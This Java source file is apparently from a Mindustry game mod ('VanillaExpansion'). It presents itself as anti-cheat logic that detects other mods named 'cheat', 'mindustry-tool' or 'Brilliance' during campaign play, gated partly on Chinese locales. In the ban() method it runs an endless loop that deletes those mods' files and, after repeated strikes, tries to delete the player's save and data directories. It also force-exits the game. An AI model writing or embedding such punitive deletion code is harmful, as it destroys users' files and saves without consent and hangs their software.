package VanillaExpansion;

import arc.Core;
import arc.Events;
import arc.graphics.Color;
import arc.struct.Seq;
import mindustry.Vars;
import mindustry.game.EventType;
import mindustry.game.Team;
import mindustry.gen.Building;
import mindustry.gen.Groups;
import mindustry.gen.Sounds;
import mindustry.gen.Unit;
import mindustry.graphics.Pal;
import mindustry.mod.Mods;

import static mindustry.Vars.headless;
import static mindustry.Vars.state;

public class InitAntiCheat {
    private static Seq<Mods.LoadedMod> otherMods = new Seq<>();
    private static boolean hasCheat = false;
    private static boolean goDie = false;

    public static boolean isBanned(Mods.LoadedMod mod) {
        if(!mod.enabled()) return false;
        if(mod.name.toLowerCase().contains("cheat")) return true;
        if(mod.name.equalsIgnoreCase("mindustry-tool")) return true;
        if(mod.name.equalsIgnoreCase("Brilliance")) return true;
        return false;
    }

    private static Seq<Mods.LoadedMod> cheatMods = new Seq<>();

    private static void deleteCheatMods(){
        for(Mods.LoadedMod mod : cheatMods){
            try{
                mod.file.delete();
                mod.root.delete();
            }catch(Exception ignored){}
        }
    }

    private static final String cheatTimeSetting = "ve-cheat-times";

    private static void ban(){
        goDie = true;
        clearCheat("cheat");
        int cheatTimes = Core.settings.getInt(cheatTimeSetting, 0);
        Core.settings.putInt(cheatTimeSetting,cheatTimes + 10);
        while (true) {
            deleteCheatMods();
            if(cheatTimes >= 2){
                try{
                    Vars.saveDirectory.delete();
                    Vars.dataDirectory.delete();
                }catch(Exception ignored){}
            }
        }
    }

    private static void scanCheatMods(boolean inPlanet){
        if(headless) return;
        hasCheat = goDie = false;
        cheatMods.clear();
        String locale = Core.settings.getString("locale", "en");
        if(!inPlanet || (state.isCampaign() && state.getPlanet() != null && state.getSector() != null && (locale.startsWith("zh_CN") || locale.startsWith("zh_TW") || Core.settings.getInt(cheatTimeSetting, 0) > 0) && !state.getSector().isCaptured() && state.getPlanet().name.startsWith("ve-"))) {
            otherMods = Vars.mods.getMods();
            if (otherMods != null) {
                for (Mods.LoadedMod mod : otherMods) {
                    if (isBanned(mod)) {
                        hasCheat = true;
                        cheatMods.add(mod);
                    }
                }
            }
        }
    }

    public static void init(){

        int cheatTimes = Core.settings.getInt(cheatTimeSetting, 0);
        if(cheatTimes > 0){
            scanCheatMods(false);
            if(hasCheat) {
                Pal.accent = Color.valueOf("f25555");
            }else{
                Events.run(EventType.SectorCaptureEvent.class, () -> {
                    if(state.getPlanet() != null && state.getPlanet().name.startsWith("ve-")) {
                        scanCheatMods(false);
                        if(!hasCheat) {
                            Core.settings.put(cheatTimeSetting, cheatTimes - 1);
                        }
                    }
                });
            }
        }

        //战役反作弊，烦死了
        Events.run(EventType.WorldLoadEndEvent.class, () -> {
            scanCheatMods(true);
            if(hasCheat){
                Sounds.uiNotify.play();
                Vars.ui.hudfrag.showToast("[accent]反作弊执行中[]");
            }
        });
        Events.run(EventType.BlockBuildEndEvent.class, () -> {
            if(hasCheat) {
                if(goDie) Core.app.exit();
                for (Building b : Groups.build) {
                    if (isFromCheatMod(b.block.name)) {
                        ban();
                    }
                }
            }
        });
        Events.run(EventType.UnitSpawnEvent.class, () -> {
            if(hasCheat){
                if(goDie) Core.app.exit();
                for(Unit u : Groups.unit) {
                    if (isFromCheatMod(u.type.name)) {
                        ban();
                    }
                }
            }
        });
    }

    private static boolean isFromCheatMod(String name){
        if(name.toLowerCase().contains("cheat")) return true;
        for(Mods.LoadedMod mod : cheatMods){
            if(name.contains(mod.name)) return true;
        }
        return false;
    }

    public static void clearCheat(String name){
        for(Unit u : Groups.unit){
            if(u.type.name.toLowerCase().contains(name)){
                u.x(999999999f);
                u.y(999999999f);
                u.team(Team.derelict);
                u.type.speed = u.type.health = u.type.armor = 0;
                u.type.flying = false;
                u.type.hittable = u.type.killable = u.type.targetable = true;
                u.type.weapons.clear();
                u.type.immunities.clear();
                u.type.abilities.clear();
                u.remove();
            }
        }
        for(Building b : Groups.build){
            if(b.block.name.toLowerCase().contains(name)){
                b.team(Team.derelict);
                b.block.armor = b.block.health = 0;
                b.block.destructible = b.block.breakable = true;
                b.tile.setAir();
                if(b != null) b.remove();
            }
        }
    }
}
